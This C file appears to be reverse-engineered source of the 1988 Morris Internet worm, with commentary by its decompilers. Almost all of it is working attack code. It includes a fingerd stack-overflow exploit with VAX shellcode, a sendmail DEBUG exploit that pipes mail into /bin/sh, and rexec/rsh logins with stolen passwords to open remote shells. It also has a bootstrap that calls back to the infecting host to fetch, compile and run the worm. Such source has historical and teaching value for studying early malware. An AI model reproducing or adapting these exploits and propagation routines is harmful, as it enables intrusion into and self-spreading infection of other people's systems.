/*
 * Copyright (c) 1988 The Regents of the University of California.
 * All rights reserved.
 *
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF THE UNIVERSITY
 * OF CALIFORNIA.  The copyright notice above does not evidence
 * any actual or intended publication of this source code.
 *
 * Copying or redistribution in any form is explicitly forbidden
 * unless prior written permission is obtained from Michael Karels or an
 * authorized representative of the University of California, Berkeley.
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <signal.h>
#include <string.h>
#include <ctype.h>
#include "types.h"

extern struct object objects[];
extern int nobjects;
extern struct host *me;
int alarmed;
char *inet_ntoa();
struct in_addr a2in();

/* interact with the bootstrapper on a newly infected host */
int
waithit(hostp, myaddr_unused, port_unused, magic, wfd)
	struct host *hostp;
	u_long myaddr_unused;
	int port_unused, wfd;
	long magic;
{
	struct sockaddr addr;
	int addrlen;
	int (*oldalrm_unused)(), justreturn();
	u_long tmp;
	int iobj, iobj2;
	char objnames[UNKNOWN][128];
	struct object *objp;
	int nbytes;
	char buf[UNKNOWN];
	char *cp;
	int ns;

	oldalrm_unused = signal(SIGALRM, justreturn);
	addrlen = 16;

	/* wait up to 2 minutes for a client connection */
	(void) alarm(120);
	ns = accept(wfd, &addr, &addrlen);
	(void) alarm(0);

	/* if accept() failed, or client authentication fails, bag it */
	if (ns < 0 || xread(ns, (char *)&tmp, sizeof(tmp), 10) != 4 ||
	    (tmp = ntohl(tmp)) != magic)
		goto error;

	for (iobj = 0; iobj < nobjects; iobj++) {
		objp = &objects[iobj];

		/* send name length */
		tmp = htonl((u_long) objp->len);
		(void) write(ns, (char *)&tmp, sizeof tmp);

		/* send machine type */
		sprintf(objnames[iobj], XS("x%d,%s"), random() % 0xffffff, 
				objp->name);
		(void) write(ns, objnames[iobj], 128);

		/* send encrypted name */
		xorbuf(objp->buf, objp->len);
		nbytes = write(ns, objp->buf, objp->len);
		xorbuf(objp->buf, objp->len);
		if (nbytes != objp->len) {
			goto error;
		}
	}

	/* another handshake */
	tmp = htonl((u_long) -1);
	if (write(ns, (char *)&tmp, sizeof tmp) != sizeof tmp)
		goto error;

	sleep(4);

	if (resynch(ns, ns, 30) == 0)
		goto error;

	/* try to clean out old sh; if we fail, use an alternate name */
	send_string(ns, XS("PATH=/bin:/usr/bin:/usr/ucb\n"));
	send_string(ns, XS("rm -f sh\n"));
	sprintf(buf, XS("if [ -f sh ]\nthen\nP=x%d\nelse\nP=sh\nfi\n"), 
			random() % 0xffffff);
	send_string(ns, buf);

	for (iobj = 0; iobj < nobjects; iobj++) {
		/* if not an object file, skip it */
		if ((cp = index(objnames[iobj], '.')) == 0 || cp[1] != 'o')
			continue;

		/* compile it, put result in $P */
		sprintf(buf, XS("cc -o $P %s\n"), objnames[iobj]);
		send_string(ns, buf);

		/* wait and synchronize */
		if (resynch(ns, ns, 30) == 0)
			goto error;

		/* now that we've built it, run it (recursive??) */
		sprintf(buf, XS("./$P -p $$"));
		for (iobj2 = 0; iobj2 < nobjects; iobj2++) {
			(void) strcat(buf, objnames[iobj2]);
			(void) strcat(buf, XS(" "));
		}
		(void) strcat(buf, XS("\n"));
		send_string(ns, buf);

		/* wait and synchronize */
		if (resynch(ns, ns, 10) == 0) {
			(void) close(ns);
			(void) close(wfd);
			hostp->flags |= H_INFECTED;
			return 1;
		}

		/* clean up */
		send_string(ns, XS("rm -f $P\n"));
	}

	/* clean up some more -- why remove $P every iteration??? */
	for (iobj = 0; iobj < nobjects; iobj++) {
		sprintf(buf, XS("rm -f %s $P\n"), objnames[iobj]);
		send_string(ns, buf);
	}
	(void) resynch(ns, ns, 5);

error:
	(void) close(ns);
	(void) close(wfd);
	return 0;
}

/* 2014 waithit+462 */
static int
run_l1(h_unused, fpipe, myaddr, port, magic, fd_unused)	/* 0x2014 */
	struct host *h_unused;
	int fpipe;
	u_long myaddr;
	int port, fd_unused;
	long magic;
{
	struct object *objp;
	char buf[512], xname[50];
	int nbytes;
	long i;

	/* if we weren't fed l1.c as an argument, bag it */
	if ((objp = getobjectbyname(XS("l1.c"))) == 0)
		return 0;
	/* compile and run a C program from an encrypted in-core buffer */
	send_string(fpipe, XS("cd /usr/tmp\n"));
	i = random() % 0xffffff;
	sprintf(xname, XS("x%d.c"), i);
	sprintf(buf, XS("cat > %s<<'EOF'\n"), xname);
	send_string(fpipe, buf);
	xorbuf(objp->buf, objp->len);
	nbytes = write(fpipe, objp->buf, objp->len);
	xorbuf(objp->buf, objp->len);
	if (nbytes != objp->len)
		return 0;
	send_string(fpipe, XS("EOF\n"));
	sprintf(buf, XS("cc -o x%d x%d.c;x%d %s %d %d;rm -f x%d x%d.c\n"),
		i, i, i, inet_ntoa(a2in(myaddr)), 
		htons(port), magic, i, i);
	send_string(fpipe, buf);
	/* oops?  what is our return value? */
}

/* 21be waithit+60c */
/* static */ /* XXX we use more files than the author did */
send_string(fd, s)			/* 0x21be */
	int fd;
	char *s;
{

	(void) write(fd, s, strlen(s));
}

/* 21e0 waithit+62e */
/* static */ /* XXX we use more files than the author did */
int
pipe_to_rsh(host, inp, outp, cmd)	/* 0x21e0 */
	char *host;
	int *inp, *outp;
	char *cmd;
{
	int pid, p1[2], p2[2], i;

	/*
	 * Make two pipes, then fork.
	 */
	if (pipe(p1) < 0)
		return 0;
	if (pipe(p2) < 0) {
		(void) close(p1[0]);
		(void) close(p1[1]);
		return 0;
	}
	if ((pid = fork()) < 0) {
		(void) close(p1[0]);
		(void) close(p1[1]);
		(void) close(p2[0]);
		(void) close(p2[1]);
		return 0;
	}

	/* if child, exec "rsh host cmd" */
	if (pid == 0) {
		for (i = 0; i < 32; ++i)
			if (i != p1[0] && i != p2[1] && i != 2)
				(void) close(i);
		(void) dup2(p1[0], 0);
		(void) dup2(p2[1], 1);
		if (p1[0] > 2)
			(void) close(p1[0]);
		if (p2[1] > 2)
			(void) close(p2[1]);
		(void) execl(XS("/usr/ucb/rsh"), XS("rsh"), host, cmd,
			(char *) 0);
		(void) execl(XS("/usr/bin/rsh"), XS("rsh"), host, cmd,
			(char *) 0);
		(void) execl(XS("/bin/rsh"), XS("rsh"), host, cmd,
			(char *) 0);
		exit(1);
		/* NOTREACHED */
	}

	/* discard wrong end of pipes; store correct ends */
	(void) close(p1[0]);
	(void) close(p2[1]);
	*inp = p2[0];
	*outp = p1[1];

	/* resynch with remote shell */
	if (resynch(*inp, *outp, 30))
		return 1;

	/* failed, so kill it */
	(void) close(*inp);
	(void) close(*outp);
	(void) kill(pid, SIGKILL);
	sleep(1);
	(void) wait3((union wait *)0, WNOHANG, (struct rusage *)0);
	return 0;
}

/*
 * Resynchronise with a shell by asking it to print a
 * random number, then waiting for a while for that number
 * to come back.
 * Return true iff we managed to synch up.
 */
static int
resynch(infd, outfd, timeout)		/* 0x23ce */
	int infd, outfd, timeout;
{
	char buf1[100], buf2[100];

	(void) sprintf(buf1, XS("%d"), random() & 0xffffff);
	(void) sprintf(buf2, XS("\n/bin/echo %s\n"), buf1);
	send_string(outfd, buf2);
	return wait_for_string(infd, buf1, timeout);
}

/* static */ int			/* different file structure */
wait_for_string(fd, s, timeout)		/* 0x2462 */
	int fd;
	char *s;
	int timeout;
{
	char lbuf[512];
	int i;
	int len;

	len = strlen(s);
	if (xreadstr(fd, lbuf, 512, timeout))
		for (i = 0; lbuf[i]; ++i)
			if (strncmp(s, &lbuf[i], len) == 0)
				return 1;
	return 0;
}

/* a signal handler */
justreturn()
{

	alarmed = 1;
}

/*
 * Read, with a timeout.
 */
/* 24f2 justreturn+e */
static int
xreadstr(fd, buf, buflen, timeout)	/* 0x24f2 */
	int fd;
	char *buf;
	int buflen, timeout;
{
	int i, f8_unset, mask;
	struct timeval tv;

	/* f8 not set... use lint!! */

	for (i = 0; i < buflen; ++i) {
		mask = 1 << fd;
		tv.tv_sec = timeout;
		tv.tv_usec = 0;
		if (select(fd + 1, &mask, (int *)0, (int *)0, &tv) <= 0)
			return 0;
		if (read(fd, &buf[i], 1) != 1)
			return 0;
		if (buf[i] == '\n')
			break;
	}

	/* oops -- don't write past end of buffer! */
	buf[i] = 0;

	if (i > 0 || f8_unset > 0)
		return 1;
	return 0;
}

/**** not used?? ****/
static char *
s_0x2594(a4, a8)		/* 0x2594 */
	char *a4, *a8;
{

	*a8 = 0;
	if (a4 == 0)
		return 0;
	while (isspace(*a4))
		a4++;
	if (*a4 == 0)
		return 0;
	while (*a4 && !isspace(*a4))
		*a8++ = *a4++;
	*a8 = 0;
	return (a4);
}

/* attack a host through its finger server */
/* only works if remote host is a VAX */
/* at least, a sample sun3.o has VAX magic code */
/* static */ int			/* we use a different file breakdown */
hack_fingerd(h, inp, outp)		/* 0x25ec */
	struct host *h;
	int *inp, *outp;
{
	int i, j;
	int fc_unused, f10_unused;
	int s;
	struct sockaddr_in sin;
	int f34_unused, f38_unused;
	char buf[1024];
	int (*oldalarm_unused)();
	int justreturn();
	static char magic_string_buffer[] = "???";

	/* find an address that works */
	/* spend up to 10 seconds trying each address */
	oldalarm_unused = signal(SIGALRM, justreturn);
	for (i = 0; i < 6; i++) {
		if (h->addrs[i] == 0)
			continue;
		s = socket(AF_INET, SOCK_STREAM, 0);
		if (s < 0)
			continue;
		bzero((char *)&sin, sizeof(sin));
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = h->addrs[i];
		sin.sin_port = htons(79);	/* fingerd */
		(void) alarm(10);
		if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
			(void) alarm(0);
			(void) close(s);
			continue;
		}
		(void) alarm(0);
		break;
	}
	if (i >= 6)
		return 0;

	/*
	 * Fill buffer with NUL, then control-A; then install magic code.
	 */
	for (i = 0; i < 536; i++)
		buf[i] = 0;
	for (i = 0; i < 400; i++)
		buf[i] = 1;
	for (j = 0; j < 28; j++) {
		buf[i + j] = magic_string_buffer[j];
		/*
		 * magic string is:
		 *	dd 8f	  pushl (pc)+
		 *	'/sh\0'
		 *	dd 8f	  pushl (pc)+
		 *	'/bin'
		 *	d0 5e 5a  movl sp,r10
		 *	dd 00	  pushl $0
		 *	dd 00	  pushl $0
		 *	dd 5a	  pushl r10
		 *	dd 03	  pushl $3
		 *	d0 5e 5c  movl sp,ap
		 *	bc 3b	  chmk $SYS_execve
		 */
	}
	/*
	 * Now hand-craft the stack to which fingerd should return.
	 */
	*(long *)&buf[528] = 0x7fffe9fc;
	*(long *)&buf[524] = 0x7fffe8a8;
	*(long *)&buf[520] = 0x7fffe8bc;
	*(long *)&buf[516] = 0x28000000;
	*(long *)&buf[532] = 0x1c020;
	(void) write(s, buf, 536);
	(void) write(s, XS("\n"), 1);
	sleep(5);
	if (resynch(s, s, 10)) {
		*inp = s;
		*outp = s;
		return 1;
	}
	(void) close(s);
	return (0);
}

/**** not used?? ****/
static u_long
s_0x27d4(a4)			/* 0x27d4 */
	u_long a4;
{
	u_long ret;
	int i;

	ret = 0;
	for (i = 0; i < sizeof(u_long); i++) {
		ret <<= 8;
		ret |= a4 & 0xff;
		a4 >>= 8;
	}
	return ret;
}

/* randomize an array 'base' of 'len' elements of size 'size' */
permute(base, len, size)
	char *base;
	int len, size;
{
	int i, j;
	char buf[512];

	for (i = 0; i < len * size; i += size) {
		j = (random() % len) * size;
		bcopy(&base[i], buf, size);
		bcopy(&base[j], &base[i], size);
		bcopy(buf, &base[j], size);
	}
}

/* infect a remote host through sendmail */
/* static */ int			/* we use a different file breakdown */
hack_sendmail(h)			/* 0x28a8 */
	struct host *h;
{
	long i;
	int f8_unused, fc_unused, f10_unused;
	int s;
	struct sockaddr_in sin;
	char buf[512];
	int (*oldalarm_unused)();
	u_long myaddr;
	long magic;
	int port, fd;

	/* get a random local port and a magic number */
	if (!makemagic(h, &myaddr, &port, &magic, &fd))
		return 0;

	/* look for an address we can use for attack */
	oldalarm_unused = signal(SIGALRM, justreturn);
	for (i = 0; i < 6; i++) {
		if (h->addrs[i] == 0)
			continue;
		s = socket(AF_INET, SOCK_STREAM, 0);
		if (s < 0)
			continue;
		bzero((char *)&sin, sizeof(sin));
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = h->addrs[i];
		sin.sin_port = htons(25);	/* sendmail SMTP */
		(void) alarm(10);
		if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
			(void) alarm(0);
			(void) close(s);
			continue;
		}
		(void) alarm(0);
		break;
	}
	if (i >= 6)
		return 0;

	/* look for a successful SMTP connection */
	if (!resp24(s, buf) || buf[0] != '2')
		goto bad;

	/* utter the magic word */
	send_string(s, XS("debug\n"));
	if (!resp24(s, buf) || buf[0] != '2')

	/* mail from /dev/null -- how cute.  gag me */
	send_string(s, XS("mail from:</dev/null>\n"));
	if (!resp24(s, buf) || buf[0] != '2')

	/* what the heck do we need this for? */
	/* anyway, here's the nasty hack */
	i = random() & 0x00ffffff;
	sprintf(buf,
	    XS("rcpt to:<\"| sed '1,/^$/d' | /bin/sh ; exit 0\">\n"),
	    i, i);			/* XXX too many args */
	send_string(s, buf);
	if (!resp24(s, buf) || buf[0] != '2')
		goto bad;

	/* feed the bootstrap source over */
	send_string(s, XS("data\n"));
	if (!resp24(s, buf) || buf[0] != '2')
		goto bad;
	send_string(s, XS("\n"));
	run_l1(h, s, myaddr, port, magic, fd);
	send_string(s, XS("\n.\n"));
	if (!resp24(s, buf) || buf[0] != '2') {
		(void) close(fd);
		goto bad;
	}
	send_string(s, XS("quit\n"));
	if (!resp24(s, buf) || buf[0] != '2') {
		(void) close(fd);
		goto bad;
	}
	(void) close(s);

	/* wait for a connection from the remote worm */
	return waithit(h, myaddr, port, magic, fd);

bad:
	send_string(s, XS("quit\n"));
	(void) resp24(s, buf);
	(void) close(s);
	return 0;
}

/* look for a status code from an Internet transport service -- e.g. SMTP */
int
resp24(fd, buf)
	int fd;
	char *buf;
{
	struct timeval f8_unused;
	int i;

	*buf = 0;
	for (i = 0; i < 40; i++) {
		if (!xreadstr(fd, buf, 512, 20))
			return 0;
		/* every line begins with three digits */
		if (isdigit(buf[0]) && isdigit(buf[1]) && isdigit(buf[2]) &&
		    buf[3] == ' ')
			return 1;
	}
	return 0;
}

/* attack a host through a user's .rhosts file */
hu1(mp, h, username)
	struct muck *mp;
	struct host *h;
	char *username;
{
	char user[256];
	char buf[512];
	struct timeval f308_unused;
	int ret, i, fd;

	/* don't attack ourselves or any host that we already hit */
	if (h == me)
		return 0;
	if (h->flags & H_INFECTED)
		return 0;

	/* see if we can even get at this host */
	if (h->addrs[0] == 0 || h->name[0] == 0)
		getaddrs(h);
	if (h->addrs[0] == 0) {
		h->flags |= H_CANTHIT;
		return 0;
	}

	/* get our own copy of the user name;
	   make sure it contains no punctuation */
	(void) strncpy(user, username, sizeof(user) - 1);
	user[sizeof(user) - 1] = 0;
	if (*user == 0)
		(void) strcpy(user, mp->name);
	for (i = 0; user[i]; i++)
		if (ispunct(user[i]) || user[i] < ' ')
			return 0;

	/* check clients */
	other_sleep(1);

	/* try to get a remote exec directly */
	fd = hack_rexec(h, user, mp->passwd);
	if (fd >= 0) {
		ret = sendworm(h, fd, fd);
		(void) close(fd);
		return (ret);
	}
	if (fd == -2)
		return 0;

	/* try using rsh from the local machine instead */
	fd = hack_rexec(me, mp->name, mp->passwd);
	if (fd >= 0) {
		sprintf(buf,
		    XS("exec /usr/ucb/rsh %s -l %s 'exec /bin/sh'\n"),
		    h->name, user);
		send_string(fd, buf);
		sleep(10);
		ret = 0;
		if (resynch(fd, fd, 25))
			ret = sendworm(h, fd, fd);
		(void) close(fd);
		return (ret);
	}

	/* we failed */
	return 0;
}

/* connect to an rexecd on a specified host */
static
hack_rexec(h, name, passwd)		/* 0x2e92 */
	struct host *h;
	char *name, *passwd;
{
	int s, i;
	struct sockaddr_in sin;
	char buf[512];
	int justreturn();

	/* try each address looking for a successful connection */
	for (i = 0; i < 6; i++) {
		if (h->addrs[i] == 0)
			continue;
		s = socket(AF_INET, SOCK_STREAM, 0);
		if (s < 0)
			continue;
		bzero((char *)&sin, sizeof(sin));
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = h->addrs[i];
		sin.sin_port = htons(512);	/* rexec */
		(void) alarm(8);
		(void) signal(SIGALRM, justreturn);
		if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
			alarm(0);
			(void) close(s);
			continue;
		}
		(void) alarm(0);
		break;
	}
	if (i >= 6)
		return (-2);

	/* test the connection */
	if (write(s, XS(""), 1) != 1)
		goto bad;

	/* follow the rexec protocol */
	(void) write(s, name, strlen(name) + 1);
	(void) write(s, passwd, strlen(passwd));
	if (write(s, XS("/bin/sh"), strlen(XS("/bin/sh") + 1)) < 0)
		goto bad;

	/* read our test back */
	if (xread(s, buf, 1, 20) != 1)
		goto bad;
	if (buf[0] != 0)
		goto bad;

	/* eat .profile and prompt */
	if (!resynch(s, s, 40))
		goto bad;
	return s;

bad:
	(void) close(s);
	return (-1);
}

/* next is loadobject */
